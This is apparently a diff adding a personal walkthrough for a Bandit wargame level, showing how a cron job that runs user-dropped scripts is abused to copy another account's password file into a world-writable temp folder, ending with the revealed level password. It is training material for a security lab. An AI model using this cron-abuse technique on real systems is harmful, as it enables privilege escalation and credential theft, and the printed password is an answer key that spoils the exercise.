@@ -1,7 +1,73 @@
 -----------------------------------------------------------------------------------------------------------------
 "
+A program is running automatically at regular intervals from cron, the time-based job scheduler. 
+Look in /etc/cron.d/ for the configuration and see what command is being executed.
 
+NOTE: This level requires you to create your own first shell-script. 
+This is a very big step and you should be proud of yourself when you beat this level!
+
+NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
 "
 -----------------------------------------------------------------------------------------------------------------
 
+
+cd /etc/cron.d/
+
+cat cronjob_bandit24
+
+>> @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+>> * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+
+cat /usr/bin/cronjob_bandit24.sh
+
+>> ---
+#!/bin/bash
+
+shopt -s nullglob
+
+myname=$(whoami)
+
+cd /var/spool/"$myname"/foo || exit 
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." ] && [ "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" "./$i")"
+        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
+            timeout -s 9 60 "./$i"
+        fi
+        rm -rf "./$i"
+    fi
+done
+>> ---
+
+# in short the script here is search in the path "/var/spool/bandit24/foo" and then executes any shell script owned by bandit23, gives it 60 seconds to run, and then deletes it. so we can write a script to read the password for bandit 24.
+
+mkdir /tmp/my_temp/
+
+chmod 777 /tmp/my_temp/
+
+# we make directory in "/tmp/" to make a file so we can write the password on it to have the permission to read it. then we give it "777" to make all the users have permission on it so bandit24 can write on it.
+
+# then we have to creat the script in "/var/spool/bandit24/foo/" and make it executable
+
+nano /var/spool/bandit24/foo/bash_script.sh 
+
+---
+
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/my_temp/password.txt
+
+---
+
+chmod +x /var/spool/bandit24/foo/bash_script.sh
+
+# and after 60 second the "password.txt" file will created and the script will deleated 
+
+cat /tmp/my_temp/password.txt
+
+>> gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
 
